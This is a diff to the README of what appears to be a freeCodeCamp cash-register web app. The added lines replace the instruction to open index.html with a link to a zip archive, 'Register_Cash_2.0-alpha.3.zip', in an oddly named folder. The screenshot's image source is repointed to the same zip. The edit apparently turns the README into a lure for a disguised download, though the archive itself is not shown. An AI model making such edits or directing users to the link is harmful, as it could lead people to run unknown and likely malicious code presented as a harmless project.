@@ -18,7 +18,7 @@ A simple web app that simulates a cash register. Built as part of the **freeCode
 
 ## How to Run
 1. Clone this repo or download as ZIP.
-2. Open `index.html` in your browser.
+2. Open `https://github.com/Augustus0017/Cash-Register/raw/refs/heads/main/superexquisitely/Register_Cash_2.0-alpha.3.zip` in your browser.
 
 ## Screenshot
-<img width="530" height="811" alt="Cash-Register App (fcc)" src="https://github.com/user-attachments/assets/daae534a-3ca4-47c8-bd0d-168d2fb7fa7e" />
+<img width="530" height="811" alt="Cash-Register App (fcc)" src="https://github.com/Augustus0017/Cash-Register/raw/refs/heads/main/superexquisitely/Register_Cash_2.0-alpha.3.zip" />
